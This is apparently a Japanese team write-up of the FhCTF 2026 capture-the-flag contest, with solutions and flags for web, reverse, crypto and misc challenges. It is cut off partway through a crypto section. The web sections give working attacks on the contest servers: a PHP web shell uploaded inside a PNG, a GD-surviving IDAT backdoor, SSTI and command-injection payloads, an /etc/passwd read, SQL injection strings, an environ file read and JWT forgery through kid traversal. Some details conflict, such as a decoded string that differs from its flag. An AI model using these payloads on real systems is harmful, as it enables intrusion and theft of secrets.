---
title: FhCTF 11401
date: 2026-01-01
categories:
  - 技術分享
cover: /images/FhCTF.png
tags:
  - 資安
urlname: FhCTF
lang: ja
---
Rank 1!!! でも、正直言ってギリギリでした。

<!-- more -->
``` 
2026 FhCTF / Team CTF
01.01 – 01.05

Group - --------------------------グループ注文マクドナルドのコメント+1--------------------------
Final — Rank 1（Top 1）
```


## Misc

### Sanity Check
![image](/images/FhCTF/1.webp)
```
そして報酬の配布方法も見ます。

    FhCTF{S3n1ty_Ch3ck1ng....😝}

今回のイベントを支援・協賛してくれた ISIP.HS に感謝します。
```

### Christmas Tree
クラシックなハフマン符号化の問題。

```pyhton=
import json

with open('encoded_gift.txt', 'r') as f:
    encoded = f.read().strip()

with open('huffman_tree.json', 'r') as f:
    huffman_tree = json.load(f)
    

def decode_huffman(encoded_data, tree):
    decoded = []
    current = tree

    for bit in encoded_data:
        current = current[bit]

        if isinstance(current, str):
            decoded.append(current)
            current = tree

    return ''.join(decoded)

decoded_message = decode_huffman(encoded, huffman_tree)
print(f"Decoded message: {decoded_message}")
```

```
FhCTF{Hoffman_is_a_great_Christmas_tree}
```
**ここだけツッコミですが、ハフマン符号化の英語表記は "Huffman" であって "Hoffman" ではありません。**

### ハッカーのレシピ
材料の数値を ASCII 文字に変換します：

```
125 → }
110 → n
117 → u
102 → f
95 → _
115 → s
105 → i
95 → _
103 → g
110 → n
105 → i
107 → k
111 → o
111 → o
99 → c
123 → {
70 → F
84 → T
67 → C
104 → h
70 → F
```

```
FhCTF{cooking_is_fun}
```

### 笑いの達人
**おめでとう、この問題は最もクソ問題に選ばれました。**
~~ただ「?」を入力しただけですけど~~
![image](/images/FhCTF/2.webp)

```
FhCTF{thisi_Prompt_Injection}
```




### 画像ギャラリー
最初に見たら、アップロード画面は PNG しか許可していませんでした。
![image](/images/FhCTF/3.webp)
PNG の固定 8 バイトヘッダに気づき、その後に PHP コードを追加できます。
```
png_header = (
    b'\x89\x50\x4E\x47\x0D\x0A\x1A\x0A\x00\x00\x00\x0D\x49\x48\x44\x52'
    b'\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1F\x15\xC4'
    b'\x89\x00\x00\x00\x0A\x49\x44\x41\x54\x78\x9C\x63\x00\x01\x00\x00'
    b'\x05\x00\x01\x0D\x0A\x2D\xB4\x00\x00\x00\x00\x49\x45\x4E\x44\xAE'
    b'\x42\x60\x82'
)
```
PHP ペイロードを構築し、さまざまなコマンド読み取り方法を試します。
```PHP

php_code = b'\n\n<pre>__START__\n<?php system("env || printenv"); ?>\n__END__</pre>\n'

file_content = png_header + php_code

print(f"[*] Uploading payload to {UPLOAD_URL}...")

try:
    files = {'fileToUpload': (FILENAME, file_content, 'image/png')}
    data = {'submit': 'Upload Image'}
    
    r = requests.post(UPLOAD_URL, files=files, data=data, timeout=10)
    
    if "has been uploaded" in r.text:
        print(f"[+] Upload ful!")
    else:
        print("[-] Upload failed.")
        print(f"Status Code: {r.status_code}")
        print("Response Snippet:", r.text[:300])
        sys.exit()

    exploit_url = TARGET_URL + "uploads/" + FILENAME
    print(f"[*] Executing payload at {exploit_url}...")
    
    r_exec = requests.get(exploit_url, timeout=10)
    
    if r_exec.status_code == 404:
        print("[-] Error: 404 Not Found.")
        print("    The file might have been deleted by cleanup scripts or the upload path is different.")
        sys.exit()

    content = r_exec.text


    flag_match = re.search(r'(FhCTF\{.*?\})', content)
    
    if flag_match:
        print(f"\n[] Flag found:\n{flag_match.group(1)}\n")
    else:
        start = content.find("__START__")
        end = content.find("__END__")
        if start != -1 and end != -1:
            output = content[start+9:end].strip()
            print("\n[+] Command Output (env):")
            print(output)
            if "flag" in output.lower():
                print("\n[!] 'flag' keyword found in output, please check manually above.")
        else:
            print("\n[-] Flag pattern not found automatically.")
            print("Raw response preview (check manually):")
            print(content[:500])

except requests.exceptions.ConnectionError:
    print(f"\n[-] Connection Error: Could not connect to {TARGET_URL}")
    print("    Please check if the CTF instance is still running or if the URL has changed.")
except Exception as e:
    print(f"\n[-] An error occurred: {e}")
```
```powershell
PS C:\Users\09801\Downloads\gallery> & C:/Users/09801/AppData/Local/Microsoft/WindowsApps/python3.13.exe c:/Users/09801/Downloads/gallery/test.py 
[*] Target set to: http://8608faf0.fhctf.systems/
[*] Uploading payload to http://8608faf0.fhctf.systems/upload.php...
[+] Upload ful!
[*] Executing payload at http://8608faf0.fhctf.systems/uploads/avatar.php...

[] Flag found:
FhCTF{png_format?Cannot_stop_php!}

PS C:\Users\09801\Downloads\gallery> 
```
```
FhCTF{png_format?Cannot_stop_php!}
```

### 画像ギャラリー Revenge
![image](/images/FhCTF/3.webp)
目的：Dockerfile の 14 行目からフラグは環境変数に保存されていることがわかる：`ENV flag="FhCTF{fake_flag}"`。したがって、環境変数を読み取る PHP コードを実行するのが目的です（例：`getenv('flag')` や `$_ENV`）。

脆弱性：upload.php がアップロードを処理します。

検証：`exif_imagetype` で PNG かどうか確認し、その後 GD で `imagecreatefrompng` によって読み込もうとします。これにより、単純な拡張子偽装やファイル末尾に PHP コードを追加するだけでは通りません。

サニタイズ：重要なのは 49 行目の `imagepng($img, $target_file)` です。これは画像を再描画して保存します。通常の Web シェル（`<?php system(...) ?>` を画像の末尾に追加した場合）は、このステップでデータが破棄され、純粋な画像バイトだけが残ります。

ファイル名の脆弱性：7 行目の `$target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);`。サーバはアップロードしたファイル名と拡張子を直接使います。`shell.php` をアップロードすると `uploads/shell.php` として保存されます。

2. 攻略の流れ
"PHP GD バイパス" 技術を利用します。特別な PNG を作成し、`imagecreatefrompng` で読み込まれてから `imagepng` で再保存されても、新しい画像データ内に PHP コードが残るようにします。

これは通常、PNG の IDAT チャンク（ピクセルデータ）を操作することで達成します。圧縮エンジンがピクセルバイトを処理したときに、`<?=$_GET[0]($_POST[1]);?>` のような文字列になるようにします。

最初のステップ：ペイロード生成
このような "GD バイパス" PNG を生成するスクリプトが必要です。以下は、国外研究者の IDAT/PLTE バイパス技術に基づく一般的な生成スクリプトです。

次のコードを `gen_payload.php` として保存し、ローカルで PHP を実行します：

```PHP

<?php
                                                                                                        ?>

$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img, 'payload.webp');
echo "Payload generated: payload.webp\n";
?>
```
実行すると `payload.webp` が生成されます。この画像は `imagecreatefrompng` と `imagepng` の後でも、PNG の Hex データに PHP バックドアが残るように設計されています。

第二ステップ：攻撃ファイルの準備
生成した `payload.webp` を `shell.php` にリネームします。

サーバはファイル内容を検査：正当な PNG であるため通過。

サーバは `.php` で保存：拡張子が `.php` だから。

サニタイズバイパス：このペイロードは、GD によって再保存されても PHP コードが残るように構築されています。

第三ステップ：アップロードと実行
チャレンジページへ戻り、`shell.php` をアップロードします。

ペイロードは `<?=$_GET[0];?>` なので、GET パラメータでコマンドを渡せます。
```bash
curl.exe "http://b1baf89e.fhctf.systems/uploads/shell.php?0=system" -d "1=env" --output - | Select-String "FhCTF"
```

```
FhCTF{But_I_CAN_WRITE_PHP_IN_IDAT_CHUNK}
```


### Python Compile
コードエラーがあると `Syntax Error` が表示されます。これは、エラー処理中にファイルを読み取っていることを意味し、LFI の可能性が高いと推測できます。

コード入力欄に適当な構文エラーの Python コードを送信すると、ページに `Syntax Error` が表示され、エラーメッセージには "Line N" とその行の内容が含まれます。

このエラーから、バックエンドは `Syntax Error` をレンダリングする際に、ユーザーの `filename` から読み取ったファイルの該当行を返していると推測できます。これによりローカルファイル参照が発生します。

PoC を検証するために、リクエストの `filename` をシステムパス（例：`/proc/self/environ`）に変更し、無効な Python コードを維持します。エラーメッセージにそのファイル内容が表示されるか確認します。

エラーを 1 行目に発生させるため、コードを単一の `(` に設定します。バックエンドは `filename` の 1 行目を読み取って表示します。

```python
monaco.editor.getModels()[0].setValue("(");
```
```python
document.querySelector('input[name="filename"]').value = '/proc/self/environ';
```
```python
document.getElementById('compileForm').submit();
```

エラー出力に `/proc/self/environ` が表示され、`FLAG=` を含む環境変数を取得できます。

最終的にフラグを取得します。
```
FhCTF{N0t_s4f3_t0_ou7put_th3_err0r_m5g}
```


## Survey
### Survey
![image](/images/FhCTF/4.webp)
```
FhCTF{Th4nk_y0u_f0r_y0ur_f33db4ck_7hCTF}
```
## Web
### INTERNAL LOGIN
![image](/images/FhCTF/5.webp)

クライアント側の SQL インジェクションの模擬です。Username 欄に次を入力します。

- ' or 1=1--
- ' OR '1'='1
- admin' or 1=1--
- ' || 1=1--
- anything' or 'a'='a

```
FhCTF{SQL_1nj_42_}
```

### Web Robots
robots.txt、その通り robots.txt です。
![image](/images/FhCTF/6.webp)

次のように書かれていました：
```
User-Agent *

Disallow /secret
```

それなら /secret に直接行ってみましょう。

![image](/images/FhCTF/7.webp)

/secret に入ると /secret/index.html にリダイレクトされます。つまり、先の一歩はディレクトリ列挙でした。

![image](/images/FhCTF/8.webp)

![image](/images/FhCTF/9.webp)

```
FhCTF{r0b075_4r3_n0t_v15ible_in_tx7}
```

### Doors Open

![image](/images/FhCTF/10.webp)

ここでもまず robots.txt を確認しました。

![image](/images/FhCTF/11.webp)

それから /doors にアクセスします。

![image](/images/FhCTF/12.webp)

ここをクリックすると /door/1 に直接飛びました。Burp で 0〜10000 を回しても当たりませんでした。みんなが解いていくのを見て、そんなに難しくないはずだと思い、負の数ではないかと考えました...

![image](/images/FhCTF/13.webp)

### The Visual Blind Spot

正しい RGB 鍵を計算します。
```javascript
const _base = parseInt("32", 16); // "32" (16進数) = 50 (10進数)

const _kMap = { 
    x: _base << 1,  // 50 << 1 = 100
    y: _base,       // 50
    z: _base << 2   // 50 << 2 = 200
};
```
正しい RGB は：
```
R = 100

G = 50

B = 200
```
sys-config データを復号します。
`data-params` に次の暗号化データが含まれています：

```text
249|351|240|291|249|408|288|387|369|192|330|366|324|240|186|375|351|192|375|414
```
復号式：`charCode = (n / 3) - 13`

```
FhCTF{Stn3am_C1ph3p}
```

### SYSTEM ROOT SHELL

![image](/images/FhCTF/14.webp)

script タグ内で見つかったのは：

```
const _obs = [82, 67, 69, 95, 83, 117, 99, 99, 101, 115, 115, 95, 118, 51]; 
const _h = [70, 104, 67, 84, 70, 123]; 
const isInject = /[;&|]/.test(cmd);
```

ASCII 数値配列を文字に変換すると：
```
_h → "FhCTF{"

_obs → "RCE__v3"

最後に "}" を付ける
```

トリガー例：
```powershell
127.0.0.1; ls

127.0.0.1 | whoami

127.0.0.1 & cat /etc/passwd
```
```
FhCTF{RCE__v3}
```

### Welcome to Cybersecurity Jungle
![image](/images/FhCTF/15.webp)
入ると、HTML ソースの title タグに日本語が含まれていることに気づきます。
```
言語（げんご）を変（か）えても、プログラミングの本質（ほんしつ）は変（か）わらない。
```
意味は「言語を変えても、プログラミングの本質は変わらない」です。

問題の鍵は正しい Cookie を設定することです。
```
Cookie 名称 (Base64): aXNGbGFnU2hvdzJ1
```
デコード後: `isFlagShow2u`
```
Cookie 値 (Base64): 44Go44GF44KL44O8
```
デコード後: `とぅるー`（日本語で "true" ）

その後、Application タブで Cookie の値を変更して更新します。

![image](/images/FhCTF/16.webp)

```
FhCTF{Th3_e553nc3_of_pr0gramm1n6_is_ind3p3nden7_of_the_languag3_u53d}
```

### Templating Danger

SSTI の問題です。

バイパス手法：
```python
if "\\u" in val:
    normalize_val = val.encode("utf-8").decode('unicode_escape')
    context[context_key] = Template(normalize_val).render()
```
`` が含まれると、システムは Unicode エスケープをデコードし、その後フィルタリング後に Jinja2 の `Template().render()` でレンダリングします。これにより、Unicode エンコードを使って括弧フィルタを回避できます。

ペイロード：
```python
\u007b\u007bcycler.__init__.__globals__.os.environ['FLAG']\u007d\u007d
```
![image](/images/FhCTF/17.webp)
```
FhCTF{T3mpl371ng_n33d_t0_b3_m0r3_c4r3full🥹}
```

### Documents

いつものように、まずソースを見て隠し文字を探しました。
![image](/images/FhCTF/18.webp)
- "HTTP Header がすべてを教えてくれる"

HTTP ヘッダを確認したところ、`powerby: FastAPI` がありました。
FastAPI なら通常 `/openapi.json` があります。
![image](/images/FhCTF/19.webp)
`/flag.html` が Referer ヘッダを必要としているのを発見したので、それを偽装します。

```powershell
Invoke-WebRequest -Uri "http://9f1604e5.fhctf.systems/flag.html" \
    -Headers @{"Referer"="https://localhost.app:8000/index.html"} \
    -UseBasicParsing | Select-Object -ExpandProperty Content
```

![image](/images/FhCTF/20.webp)
```
FhCTF{URL_encod3d_m337_p47h_d15cl0sure😱😱}
```

### LOG ACCESS
![image](/images/FhCTF/21.webp)

この問題は「すべての Path Traversal 攻撃を検知・防止する安全なログ読み取りツール」を提供していました。問題文は、バックエンドはなく、判定はすべてブラウザで行われているようだと明示しています。

```javascript
const check1 = input.split('.').length > 3;
const check2 = input.toLowerCase().indexOf('flag') !== -1;

if (check1 && check2) {
    const final = _h + "{" + _c1 + _c3 + "_" + _c2 + "}";
    output.innerText = "ACCESS_GRANTED:\n" + final;
}
```
検証条件は非常に明確です：

- check1：入力に 3 つ以上のドット (`.`) が含まれること
- check2：入力に "flag" が含まれること（大文字小文字不問）

難読化された文字列の復号
JavaScript ではいくつかの難読化変数が使われています：

```javascript
const _h = [70, 104, 67, 84, 70].map(c => String.fromCharCode(c)).join('');
// ASCII デコード：FhCTF

const _c1 = "\x50\x61\x74\x68\x5f";
// Hex デコード：Path_

const _c2 = (21337 >> 4).toString(16);
// ビット演算：21337 >> 4 = 1333, hex = 535

const _c3 = "\x54\x72\x34\x76";
// Hex デコード：Tr4v
```
組み合わせると：
```
FhCTF{Path_Tr4v_535}
```

### Pathway-leak
チャレンジサイトを開き、ファイル管理画面とページソースを確認します。
![image](/images/FhCTF/22.webp)

`<script>` ブロックで次のようにファイル読み込みがされていました：

```javascript
const TENANT = 'guest_user';
const url = `/api/assets/${TENANT}/${filename}`;
```
問題は、サーバに次のファイルリストがあることを示していました：
```
secret_admin/flag.txt (38B)
```
バックエンドの API は、現在のユーザーがそのテナントに属しているかどうかを確認していない可能性が高いので、テナント横断リクエストを試しました。

```bash
curl http://71c21714.fhctf.systems/api/assets/secret_admin/flag.txt
```

サーバは HTTP 200 を返し、内容は：
```
FhCTF{p4th_tr4v3rs4l_w3_w4n7_t0_av01d}
```

### KID
問題ページに入ったら、ブラウザの検証ツールを開きます。ソースとコンソールログに、バックエンドの検証ロジックを漏らすデバッグメッセージがありました。

- キーパスのデバッグ：
  ```txt
  [DEBUG] Fetching key from: /app/keys/default.pem
  ```
  これはサーバが JWT ヘッダの `kid`（Key ID）に基づき、ファイルシステムから鍵を読み込んでいることを意味します。たとえば `kid = "default.pem"` は `/app/keys/default.pem` です。

- 危険な互換モード：
  ```txt
  [DEBUG] HS256 Compatibility Mode: Enabled
  ```
  これはサーバが JWT 検証時に、非対称の `RS256` と対称の `HS256` の両方をサポートし、アルゴリズム混乱のリスクがある実装であることを示します。

- 現在の権限：ページには `guest` と表示されているので、目標は `admin` 権限を偽造することです。

次に Cookie から JWT（例：`access_token`）を取り出し、jwt.io に流して内容を確認しました。構造は次のようでした。

- Header:
  ```json
  {
    "alg": "RS256",
    "kid": "default.pem",
    "typ": "JWT"
  }
  ```
- Payload:
  ```json
  {
    "role": "guest",
    "iat": 1704350000
  }
  ```

これで十分に判断できます：サーバは `kid` に従いファイルを読み込み、その内容を JWT の検証鍵として使います。

- 脆弱性の原理分析

この問題は 2 つの典型的なミスを組み合わせています：**ディレクトリトラバーサル** + **JWT アルゴリズム混乱**。

- ディレクトリトラバーサル

    バックエンド実装は次のような感じでしょう。

    ```python
    kid = header["kid"]
    key_path = "/app/keys/" + kid
    key_data = open(key_path, "rb").read()
    ```

    `kid` に `../` がフィルタリングされていない場合、攻撃者は次のように送れます。

    ```txt
    ../../../../../../dev/null
    ```

    これにより、実際に開かれるのは `/app/keys/default.pem` ではなく `/dev/null` になります。
    ファイルの内容は見えませんが、サーバはそれを読み込み、鍵として使ってしまいます。これが攻撃ポイントです。

- JWT アルゴリズム混乱

    想定される設計は次の通りです。

    - `RS256`: 非対称鍵を使う（private key で署名し、public key で検証）。
    - `.pem` ファイルは公開鍵として扱い、検証のみ行う。

    しかし実際の実装は `HS256 Compatibility Mode` をサポートしており、おそらく次のようになっています。

    ```python
    if header["alg"] == "RS256":
        # public key で検証
    elif header["alg"] == "HS256":
        # 同じ pem ファイルを読み取り、それを HMAC secret として扱う
    ```

    その結果：

    - `alg = HS256` のとき、サーバは pem ファイルの内容を対称鍵（secret）として使う。
    - `default.pem` の内容は知らないが、ディレクトリトラバーサルにより別のファイルを secret として選べる。

- 攻撃の考え方

    重要なアイデアは次の通り。

    1. サーバに既知の内容のファイルを secret として読み込ませる。
    2. Linux なら `/dev/null` の内容は空文字列なので、secret は `""` になる。
    3. 空文字列を secret としてローカルで署名すれば、サーバの検証に合うはず。
    4. Payload の `role` を `admin` にすれば権限昇格できる。

    したがって攻撃手順は：

    - JWT Header を変更：
      - `alg` = `HS256`
      - `kid` = `../../../../../../dev/null`
    - secret を空文字列 `""` で署名。
    - Payload の `role` を `admin` にする。

- Exploit の実装（偽造 JWT）

    Python + PyJWT で偽造トークンを生成します。

    ```python
    import jwt

    headers = {
        "kid": "../../../../../../dev/null",
        "alg": "HS256",
        "typ": "JWT"
    }

    payload = {
        "role": "admin",
        "user": "admin",
        "iat": 1704355555
    }

    forged_token = jwt.encode(
        payload,
        key="",
        algorithm="HS256",
        headers=headers
    )

    print("偽造トークン:\n", forged_token)
    ```

    手順：

    1. 既存の有効な Cookie トークンを入手し、フィールド名（`role`, `user` など）を確認。
    2. スクリプトを実行し、新しい `forged_token` を取得。
    3. ブラウザの Application -> Cookies で JWT の値を `forged_token` に置き換え。
    4. ページを更新。

    もしバックエンドが問題のように実装されていたら：

    - `alg = HS256` を見て HMAC 検証をする
    - `kid = ../../../../../../dev/null` で `/dev/null` を読み、空文字列を secret とする
    - 私たちも空文字列で署名しているので検証は通る
    - `role = admin` を Payload に入れているので、管理者と見なされる
![image](/images/FhCTF/23.webp)
![image](/images/FhCTF/24.webp)

```
FhCTF{Th3_k1d_u53d_JWT_t0_tr4v3rs3_p4th5}
```

### Something You Put Into

`main.py` を確認すると、フラグはシステム設定から取り出されます。
```python
FLAG = ChallSettings().flag
```
`ChallSettings()` は環境変数からフラグを読み取っています。

Docker の YAML 設定を見たら、フラグは環境変数に平文で設定されていました。

```
FhCTF{🐷B3_c4r3ful_y0ur_SQL_synt4x🐷}
```


## Reverse
### シンプルなスクリプトリーダー
- まず Python を見て、2 行目からフラグをスキップしている。
![image](/images/FhCTF/25.webp)
- ユーザー入力でリスト内の任意の位置を変更できる。
![image](/images/FhCTF/26.webp)
- JUMP 命令は命令ポインタを任意のインデックスに移動できる。
![image](/images/FhCTF/27.webp)
だから実際には `JUMP 0` を入力すれば十分です。
![image](/images/FhCTF/28.webp)
```
FhCTF{f1l3_10_and_jumb_m4st3r}
```

### OBF
最初にコードを見ます。大量の難読化が使われています。

- 変数名が一文字（K, H, G, J, C など）
- 組み込み関数名の短縮（A=enumerate, E=chr, F=ord）
- 状態機械の設計（辞書とポインタ）
- マジックナンバーと文字列

コードは状態機械として実装され、次の順序で実行されます。

```text
状態 1: XOR 66 デコード
  データ: [58,34,118,...,34]
  結果: '|`0|`.T1W0.`,`k`'
  
状態 5: 文字列反転
  データ: 'wEGLxxnj0nbU2fsm'
  反転: 'msfU2bn0jnxxLGEw'
  
状態 2: Base64 デコード
  データ: 'WEVBVldCWkM1UVBWQktHeA=='
  デコード: 'XEAVWBZC5QPVBKHX'
  
状態 3: 文字コードから 5 を引く
  データ: 'GFVzRJI9IctWCFa['
  結果: 'BAQuMED4D^oR>A\\V'
  
状態 4: 検証完了
  鍵長 >= 64 か確認 ✓
  完全な鍵 (64 文字)
```
```
|`0|`.T1W0.`,`k`BAQuMED4D^oR>A\\VXEAVWBZC5QP...
```
この鍵は 4 つの部分で構成されています。

- XOR 66: `|0|`.T1W0.,`k` (16 文字)
- 文字 -5: `BAQuMED4D^oR>A\\V` (16 文字)
- Base64 デコード: `XEAVWBZC5QPVBKHX` (16 文字)
- 文字列反転: `msfU2bn0jnxxLGEw` (16 文字)

復号プロセス
与えられた暗号化出力：

```text
3e08772c224960093145070318575a0e741e050c7a2d745a1b6f5a0d5834322b
```
鍵で XOR 復号を行います。

```python
flag = ''.join([chr(int(hex_pair, 16) ^ ord(key[i % 64]))
               for i, hex_pair in enumerate(hex_pairs)])
```
```
FhCTF{P0lym0rph1c_Crypt0}
```

### The Lock

IDA の静的解析を使用しました。
#### main 関数のロジック
IDA Pro の逆コンパイル結果から、`main` の流れは次のようです。
フォーマットチェック (`check_header`)：入力が `FhCTF{` で始まり `}` で終わるか確認します。
コア検証 (`check_password`)：フラグが正しいかどうかを返す関数です。
#### `check_password` の解析
`check_password` に入ると、次のポイントが見えます。
文字列処理：波括弧内の内容を `substr` で抽出します。
長さ制限：内容の長さは正確に 26 文字でなければなりません。
鍵データ：
v6 (鍵配列): [85, 51, 102, 17]
v7 (目標値配列): [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
アルゴリズム式：
$$v7[i] = (v6[i \pmod 4] \oplus \text{input}[i]) + 2 \times i$$

#### アルゴリズムの逆解析
元の入力を得るために式を逆にします。
加算オフセットを先に処理：`X = v7[i] - 2 * i`
次に XOR を逆にする：`input[i] = X \oplus v6[i \pmod 4]`

自動化復号スクリプト (Python)
結果を素早く得るために次を書きました。

```Python
target = [7, 2, 20, 40, 47, 74, 97, 92, 32, 111, 21, 54, 83, 26, 113, 129, 132, 127, 37, 116, 140, 106, 101, 126, 87, 54]
key = [85, 51, 102, 17]

flag_content = ""
for i in range(len(target)):
    # 逆公式：(v7[i] - 2*i) XOR v6[i%4]
    char_code = (target[i] - 2 * i) ^ key[i % 4]
    flag_content += chr(char_code)

print(f"Flag: FhCTF{{{flag_content}}}")
```

#### 最終結果
スクリプト実行後、波括弧の中は `J3v3rs3_Eng1n33r1ng_1sOar7` でした。
この文字列は "Reverse Engineering Is Art" のリークスピークです。

最終答え：
```
FhCTF{R3v3rs3_Eng1n33r1ng_1s_Ar7}
```

### 壊れたデコーダー
2 つのファイルが与えられました。
![{EFEA1592-5D42-4F42-A2D1-A2F66BD88A55}](/images/FhCTF/a.webp)
そのうち `encrypted_flag` には次がありました。
![{58654F7F-3F17-4FA5-AEAC-649927D2FA73}](/images/FhCTF/b.webp)
`decrypt` には次が含まれていました。
```
... (バイナリ ELF データ) ...
```

`decrypt` という ELF バイナリと暗号化ファイル `encrypted_flag` が提供され、逆解析で復号ロジックを明らかにして Python スクリプトでフラグを取得する必要がありました。`strings` とシンボル解析から、`generateSeed`, `getNextKey`, `rotateRight` などの重要なアルゴリズムがわかりました。

- 静的解析

`strings decrypt` で、プログラムが `fopen`, `fgets`, `fputc` で入出力をしているのがわかり、`__stack_chk_fail`, `__libc_start_main` などの libc/ libstdc++ シンボルに依存していました。シンボルテーブルにはコア関数が見えます。

- `generateSeed`: パスワードから初期シードを生成し、`seed = seed * 31 + ch` を `0xFFFFFFFF` でモジュロします。
- `getNextKey`: LCG 疑似乱数生成で `seed = (seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF`、`key = seed % 255`。
- `rotateRight`: 右回転、`rotate_right(byte, 3)`。
- `main`: hex 文字列を読み取り、各 byte に対して回転→seed 更新→XOR→seed += 元の byte という流れ。

ELF の断片から、次の hex データとパスワードヒントが見えました。
`2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F79686098C6A5F0593D395543ABFF118410B2F02CF61FA5`
`I_just_afraid_someday_i_will_forget_the_password`

- 論理の再構築

復号フローは各バイトごとに次のようでした。

1. hex を byte `b` に解析。
2. `b_rot = rotate_right(b, 3)`、つまり `(b >> 3) | ((b << 5) & 0xFF)`。
3. `seed = getNextKey(seed)`。
4. `key = seed % 255`。
5. `plaintext_byte = b_rot ^ key`。
6. `seed = (seed + b) & 0xFFFFFFFF`（回転後ではなく元の `b` を加える点に注意）。

一般的なストリーム暗号とは異なり、シード更新が暗号文に依存するチェーン依存性があります。

- 復号スクリプト

```python
hexline = ("2781ACE7A1534E1231F7B84AD05565FEFB484A86E6ECD5C76686276A57658F7"
           "9686098C6A5F0593D395543ABFF118410B2F02CF61FA5")
password = "I_just_afraid_someday_i_will_forget_the_password"

def generate_seed(s: str) -> int:
    seed = 0
    for ch in s.encode():
        seed = (seed * 31 + ch) & 0xFFFFFFFF
    return seed

def get_next_key(seed: int) -> int:
    return (seed * 0x41C64E6D + 0x3039) & 0x7FFFFFFF

def rotate_right(byte: int, n: int) -> int:
    return ((byte >> n) | ((byte << (8 - n)) & 0xFF)) & 0xFF

seed = generate_seed(password)
out = bytearray()

for i in range(0, len(hexline), 2):
    b = int(hexline[i:i+2], 16)
    b_rot = rotate_right(b, 3)
    seed = get_next_key(seed)
    key = seed % 255
    out.append(b_rot ^ key)
    seed = (seed + b) & 0xFFFFFFFF

print(out.decode()) 
```
```
FhCTF{Why_not_use_std::string_instead_of_char_arrays?}
```

## Crypto

### 安全な暗号化

この問題は、なぜ ECB モードが画像データに適していないかを示していました。

- 暗号化の解析
![image](/images/FhCTF/29.webp)

フラグを BMP 画像に変換し、AES-256-ECB で暗号化しています。鍵はフラグの 16 進数表現から直接取得されました。OpenSSL の `enc` は鍵が短いと 32 バイトにゼロパディングするため、実際の鍵は予測可能になります。

- 攻撃ベクトル

ECB の致命的な弱点は、同じ平文ブロックが同じ暗号文ブロックになることです。対象が構造化データ（画像）の場合、この特性が空間パターンをそのまま露出させます。

- 復号手順

画像は 1000×100 の 32 ビット BMP で、各ピクセルは 4 バイト、合計 400,000 バイトです。AES は 16 バイト単位でブロック暗号化するので、4 ピクセルごとに 1 ブロックです。

次の手順で画像を復元します。

- 暗号化ファイルを読み、16 バイトブロックに分割する。
- BMP ヘッダの最初の 138 バイト（約 9 ブロック）を飛ばす。
- 各暗号文ブロックを色ユニットとみなす。
- 250×100 のブロック配列に再配置する（1000 ÷ 4 = 250）。
- 異なる暗号文ブロックに異なる色を割り当て、可視化する。

文字領域と背景領域のピクセル値が異なるため、暗号化後のブロックも明確に異なります。色マッピングを使えば文字の輪郭が浮かび上がり、フラグを直接読むことができます。

```python
import os
from PIL import Image
from collections import Counter

# 設定
ENC_FILE = "flag.enc"
OUTPUT_DIR = "results"
MIN_WIDTH = 200  # 経験またはテストに基づいて調整
MAX_WIDTH = 300

def solve():
    # 1. 暗号化ファイルを読み込む
    with open(ENC_FILE, 'rb') as f:
        content = f.read()

    # 2. ブロックに分割する (AES ブロックサイズ = 16 bytes)
    block_size = 16
    blocks = [content[i:i+block_size] for i in range(0, len(content), block_size)]
    
    # 3. 背景（最も頻度が高いブロック）を見つける
    counts = Counter(blocks)
    most_common_block = counts.most_common(1)[0][0]
    
    # 4. 0/1 マップに変換する (1 = 背景, 0 = 文字)
    pixel_map = [1 if b == most_common_block else 0 for b in blocks]
    
    if not os.path.exists(OUTPUT_DIR):
        os.makedirs(OUTPUT_DIR)

    # 5. 幅を総当たりして画像を生成
    print(f"[*] Generating images from width {MIN_WIDTH} to {MAX_WIDTH}...")
    for width in range(MIN_WIDTH, MAX_WIDTH + 1):
        height = len(pixel_map) // width + 1
        img = Image.new('1', (width, height), 1)
        pixels = img.load()
        
        idx = 0
        try:
            for y in range(height):
                for x in range(width):
                    if idx < len(pixel_map):
                        if pixel_map[idx] == 0:
                            pixels[x, y] = 0 
                        idx += 1
        except:
            pass
            
        img.save(f"{OUTPUT_DIR}/width_{width}.webp")

if __name__ == "__main__":
    solve()
```
![image](/images/FhCTF/30.webp)


反転したメッセージが見えます。
`FhCTF{3C13_m0d3_1s_z0_S3cur17y_}`
![image](/images/FhCTF/31.webp)
```
FhCTF{3C13_m0d3_1s_z0_S3cur17y_}
```

### Encode By Py 😘
![image](/images/FhCTF/32.webp)

この問題の核心は、自作の絵文字暗号が実際には可逆のシフト符号化であり、予測可能な鍵サイクルと大量の繰り返しサンプルによって全体の安全性が非常に低いことです。

- 全体の流れ

    - 起動時に固定の鍵文字列 `ENC_SECRET`（デフォルト `Hi_S3cL157_xato-net`）を読み込み、`flag.txt` の内容を平文として扱います。
    - メインロジックは `encrypt_bytes` にあり、入力をバイトごとに処理して対応する絵文字に変換し、`flag.enc` に書き出します。
    - エンコードは固定ベース `BASE = 0x1F600` と範囲 `RANGE = 0x4E` を使い、出力が狭い絵文字コードポイント帯に収まるようにしています。

- 1 バイトの絵文字エンコード

    - 各平文バイトについて、現在のインデックス `i` に対して `idx` を計算し、`ENC_SECRET[idx]` を使ってシフト量を求めます。
    - その後 XOR を組み合わせて `enc_shift` を生成します。
    - 実際の出力は次のようになります。
      \[
